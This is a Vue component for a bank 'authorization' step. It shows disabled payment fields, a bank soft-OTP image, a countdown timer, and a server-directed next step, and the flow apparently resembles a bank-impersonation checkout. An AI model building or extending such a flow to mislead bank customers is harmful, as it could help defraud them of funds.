<script setup>
import Alarm from "@/components/Layout/common/Alarm.jsx";
import Button from "@/components/Layout/common/Button.jsx";
import {useI18n} from "vue-i18n";
import {reactive, ref} from "vue";
import {ElMessage} from "element-plus";
import {useLikeSearch} from "@/hooks/index.js";
import {useRouter} from 'vue-router'
import {get, post} from "@/api/http.js";
import {getRoute} from "@/hooks/routes.js";
import {auth} from "@/api/url.js";
const {t,locale}=useI18n()
const router=useRouter()
const baseForm = ref();
const {getSearchParams, likeSearchModel} = useLikeSearch();
likeSearchModel.conditionItems = reactive([
  {
    label: "form.bank",
    type: "input",
    name: "bank",
    value: "",
    maxLength: 50,
    inputType: "text",
    span:20,
  },
  {
    label: "form.amount",
    type: "input",
    name: "amount",
    value: "",
    maxLength: 50,
    span:20,
    showPass:true
  },{
    label: "form.clew",
    type: "input",
    name: "clew",
    value: "",
    maxLength: 50,
    span:20,
    showPass:true
  },{
    label: "ref.VTB",
    type: "input",
    name: "VTB",
    value: "",
    maxLength: 50,
    span:20,
    showPass:true
  },
].map(it=>({...it,disabled:true})));
const onSubmit = () => {
  post(auth,getSearchParams()).then(v=>{
    console.log(v)
    router.push({name:getRoute(v.data.step)})
  }).catch(r=>{
    router.replace('/tra/result')
  })
}
const formConfig={
  labelWidth: 150,
  size: "default",
  labelPosition: "right",
}
const priceProps=reactive({
  currency:'VND',
  amount: "99999",
})
</script>

<template>
  <h1 class="page_title">{{$t('step.authorization')}}</h1>
  <div class="form">
    <div class="form_style">
      <BaseForm
          ref="baseForm"
          :form-items="likeSearchModel.conditionItems"
          :config="formConfig"
      />
      <div class="smart-info">
        <div class="smart-info-img">
          <img src="http://toptuna.test/images/vtb/soft_OTP.jpg" style="margin: 0 auto; height: 500px;">
        </div>

        <div class="smartnote-info-1">
          <!--          <span>{{$t('smartnote.info1')}} </span> DFH48HS <span>{{$t('smartnote.info2')}}</span>-->
          <span> </span> DFH48HS <span></span>
        </div>

        <div class="smartnote-info-2" i18n="smartnote.info3"> </div>
      </div>
    </div>
  </div>
  <div class="footer">
    <Button @btn="onSubmit">{{$t('btn.confirm')}}</Button>
    <Alarm :start-time="120" @time-end="args => $router.replace('/tra/result')"/>
  </div>
</template>

<style scoped lang="less">
/*root:deep(.btn_block){
  margin-bottom: 10px !important;
}*/
</style>